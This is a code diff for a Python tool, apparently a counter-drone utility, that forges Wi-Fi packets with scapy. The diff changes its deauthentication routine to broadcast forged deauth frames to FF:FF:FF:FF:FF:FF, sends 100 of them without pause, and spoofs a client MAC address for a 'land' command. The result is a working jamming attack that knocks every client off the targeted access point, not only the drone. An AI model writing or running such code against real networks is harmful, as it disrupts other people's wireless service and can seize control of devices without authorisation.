@@ -56,7 +56,7 @@ def active_response_land(drone_model=None, custom_ip=None):
     target_ip = custom_ip if custom_ip else profile.get("default_ip", "1.2.3.4")
     target_port = profile.get("port", 1234)
 
-    fake_client_mac = "00:AB:CD:EF:FF:FF" 
+    fake_client_mac = "80:19:70:6A:BC:5C" 
     fake_client_ip = "192.168.10.2"
 
     status_label.configure(text=f"\n Will send active defense land command")
@@ -102,7 +102,7 @@ def self_deauth():
     target_mac = profile.get("mac_address")
     gateway_mac = profile.get("ap_mac")
     iface = profile.get("interface", "wlan0")    
-    channel = profile.get("channel", "1")
+    channel = profile.get("channel", "3")
 
     if not target_mac or not gateway_mac:        
         status_label.configure(text="Error: MAC missing in JSON", text_color="red")
@@ -111,8 +111,8 @@ def self_deauth():
 
     try:
         os.system(f"iwconfig {iface} channel {channel}")
-        pkt = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth(reason=3)
-        sendp(pkt, iface=iface, count=40, inter=0.2, verbose=False)
+        pkt = RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth(reason=3)
+        sendp(pkt, iface=iface, count=100, verbose=False)
         status_label.configure(text="Deauth Sequence Completed", text_color="green")
 
     except Exception as e:
